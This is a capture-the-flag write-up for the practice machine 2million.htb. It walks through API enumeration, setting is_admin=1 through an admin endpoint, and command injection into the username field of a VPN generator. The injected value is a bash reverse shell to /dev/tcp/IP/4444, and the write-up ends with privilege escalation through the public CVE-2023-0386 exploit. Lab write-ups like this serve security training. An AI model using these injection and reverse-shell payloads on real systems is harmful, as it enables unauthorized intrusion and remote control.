![](Assets/Pasted%20image%2020260317200144.png)

First we make ping that we have connection

![](Assets/Pasted%20image%2020260317200459.png)

Then lets make a nmap `sudo nmap -sV -sS <IP_SCAN>`

![](Assets/Pasted%20image%2020260317200616.png)

Let add in the file hosts and acced in the website

![](Assets/Pasted%20image%2020260317200854.png)

![](Assets/Pasted%20image%2020260317200920.png)

We found this in the site.

![](Assets/Pasted%20image%2020260317201747.png)

So we found this code and see all of them like this.

![](Assets/Pasted%20image%2020260317204652.png)

The we use this function to make a code

![](Assets/Pasted%20image%2020260317205445.png)

So we decrypt the data and this is the message, so lets the curl, and we have a base64

`curl -X POST http://2million.htb/api/v1/invite/generate`

![](Assets/Pasted%20image%2020260317205622.png)

And we have access to a new page

![](Assets/Pasted%20image%2020260317210045.png)

So if we have a access to the api we can see maybe other access for api like `http://2million.htb/api/v1/`

So lets try somenthing in the console

```bash
curl -s -X PUT [http://2million.htb/api/v1/admin/settings/update](http://2million.htb/api/v1/admin/settings/update) \
-H "Cookie: IN_YOUR_SEESION" \
-H "Content-Type: application/json" \
-d '{}'
```

Sending that empty JSON file will prevent the server from updating anything; it will fail and return an error message in JSON format.

That error message is pure gold. It will usually say something like "Missing parameter: X".

![](Assets/Pasted%20image%2020260317212132.png)

Lets try put the email and we can see now one missing paramter

```bash
curl -s -X PUT [http://2million.htb/api/v1/admin/settings/update](http://2million.htb/api/v1/admin/settings/update) \
-H "Cookie: NAME=VALUE" \
-H "Content-Type: application/json" \
-d '{"email": "test@test.com"}'
```

![](Assets/Pasted%20image%2020260317212632.png)

Lets try to the parameter is_admin = 1, most of those fields are boolean

![](Assets/Pasted%20image%2020260317212905.png)

So now we can found another endpoint that we can exploit

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
     -H "Cookie: NAME=VALUE" \
     -H "Content-Type: application/json" \
     -d '{}'
```

We can see that we need a value.

![](Assets/Pasted%20image%2020260317214309.png)

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
     -H "Cookie: NAME=VALUE" \
     -H "Content-Type: application/json" \
     -d '{"username": "test"}'
```

And we have this output that its a ovpn so lets try to make a revershell.

![](Assets/Pasted%20image%2020260317214427.png)

Lets inject this command.

```bash
bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"

bash -c: open a new instance 
bash -i: the say not close fast waith like a human put a command
/dev/tcp/TU_IP/4444: the revershell tunnel
0>&1: take the entry for the console and redirects it so that it listens through the same tube to where it is sending the information.
```

So the curl its like.

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
     -H "Cookie: NAME=VALUE" \
     -H "Content-Type: application/json" \
     -d '{"username": "test; bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\""}'
```

Then you have access

![](Assets/Pasted%20image%2020260317215732.png)

First we check the environment files

![](Assets/Pasted%20image%2020260317220227.png)

Then we can check if the user exist in `/etc/passwd` and make one ssh

![](Assets/Pasted%20image%2020260317220348.png)

Then we have access and acced to the flag user, then we need to use a exploit **[CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386.git)**. You need to up a python server `python3 -m http.server` and then you need to put in tar this files `tar -czvf exploit.tar.gz Makefile exp.c fuse.c getshell.c ovlcap`

![](Assets/Pasted%20image%2020260317222031.png)

Now we can see the file only untar `tar -xzvf exploit.tar.gz` and continue with the instruction in the github.

![](Assets/Pasted%20image%2020260317225620.png)

Now only take the flag